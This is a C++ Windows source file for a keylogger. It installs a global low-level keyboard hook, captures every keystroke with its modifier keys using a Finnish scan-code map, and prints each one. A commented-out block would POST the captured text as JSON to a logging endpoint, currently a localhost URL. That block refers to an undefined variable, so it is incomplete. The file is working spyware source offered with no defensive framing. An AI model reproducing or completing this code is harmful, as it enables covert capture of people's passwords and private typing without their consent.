#include <iostream>
#include <Windows.h>
#include <cpr/cpr.h>

#include "layouts.h"

const char* DEBUG_URL = "http://127.0.0.1:8000/log";


LRESULT CALLBACK KeyboardCallback(int nCode, WPARAM wParam, WPARAM lParam) {
    auto *kbStruct = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);

    auto checkModifierStatus = [](int vkCode) {
        return (GetAsyncKeyState(vkCode) & 0x8000) != 0;
    };

    if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
        char c = MapVirtualKey(kbStruct->vkCode, MAPVK_VK_TO_CHAR);

        std::string final;

        if (checkModifierStatus(VK_CONTROL)) {
            final += "CTRL + ";
        }
        if (checkModifierStatus(VK_SHIFT)) {
            final += "SHIFT + ";
        }
        if (checkModifierStatus(VK_MENU)) {
            final += "ALT + ";
        }
        if (checkModifierStatus(VK_LWIN) || checkModifierStatus(VK_RWIN)) {
            final += "WIN + ";
        }

        if (scanCodeMapFI.find(kbStruct->scanCode) != scanCodeMapFI.end()) {
            final += scanCodeMapFI[kbStruct->scanCode];
        }

        printf("%s\n", final.c_str());

        //const cpr::Response r = cpr::Post(cpr::Url{DEBUG_URL}, cpr::Header{{"Content-Type", "application/json"}},
       // cpr::Body{"{\"text\": \"" + body + "\"}"});

       // printf("%s\n", r.text.c_str());
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    HHOOK keyboard = SetWindowsHookEx(WH_KEYBOARD_LL, HOOKPROC(&KeyboardCallback), nullptr, 0);

    MSG message;
    while (GetMessage(&message, NULL, NULL, NULL) > 0) {
        TranslateMessage(&message);
        DispatchMessage(&message);
    }
    UnhookWindowsHookEx(keyboard);

    return 0;
}

